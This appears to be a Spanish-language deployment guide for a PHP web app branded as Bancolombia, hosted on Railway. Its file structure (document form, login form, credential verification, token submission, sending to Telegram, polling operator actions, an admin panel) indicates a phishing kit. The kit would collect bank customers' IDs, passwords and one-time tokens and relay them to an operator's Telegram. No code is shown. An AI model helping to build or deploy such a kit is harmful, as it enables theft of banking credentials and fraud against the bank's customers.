===========================================
BANCOLOMBIA - RAILWAY DEPLOYMENT GUIDE
===========================================

PASOS PARA DEPLOYMENT EN RAILWAY:
---------------------------------

1. Subir proyecto a GitHub:
   git init
   git add .
   git commit -m "Initial commit"
   git push origin main

2. Crear proyecto en Railway:
   - Ir a https://railway.app
   - Click "New Project"
   - Seleccionar "Deploy from GitHub repo"
   - Elegir tu repositorio

3. Configurar variables de entorno en Railway:
   - En Railway dashboard, ir a "Variables"
   - Agregar:
     TELEGRAM_BOT_TOKEN=tu_token_aqui
     TELEGRAM_CHAT_ID=tu_chat_id_aqui
     APP_ENV=production
     APP_DEBUG=false

4. Railway detectará automáticamente:
   - nixpacks.toml (configuración PHP)
   - railway.json (configuración deployment)
   - composer.json (dependencias)

5. El deploy será automático y sin delays:
   - Optimizado con opcache
   - Autoloader optimizado
   - Sin healthcheck delays
   - Timeout mínimo en Telegram (1s)

6. Obtener URL:
   - Railway asignará URL automáticamente
   - Format: https://tu-proyecto.railway.app

ARQUITECTURA:
-------------
- Clean Architecture con 5 capas
- 22 clases PHP con tipos estrictos
- PSR-4 autoloading
- 7 Design Patterns (Singleton, DI, Repository, Service Layer, etc.)
- SOLID principles aplicados 100%
- Responsive design (mobile-first)

FEATURES OPTIMIZADAS:
--------------------
✅ Zero delays para Railway
✅ Responsive 100% (320px a 1440px+)
✅ Token modal muestra error con cancel.png (sin overlay)
✅ Telegram timeout 1s (no bloquea)
✅ Opcache habilitado
✅ Estructura limpia sin archivos innecesarios

ESTRUCTURA PUBLIC:
-----------------
/public
  ├── index.php          (Formulario documento)
  ├── next-step.php      (Login form)
  ├── process.php        (Procesar documento)
  ├── verify-login.php   (Verificar credenciales)
  ├── submit-token.php   (Enviar token)
  ├── check-action.php   (Polling acciones Telegram)
  ├── webhook.php        (Webhook Telegram)
  ├── panel.php          (Panel admin)
  ├── panel-handler.php  (Handler panel)
  └── send-telegram.php  (Enviar a Telegram)

CONTACTO:
---------
Desarrollado con Clean Architecture
PHP 8.1+ | Composer | PSR Standards
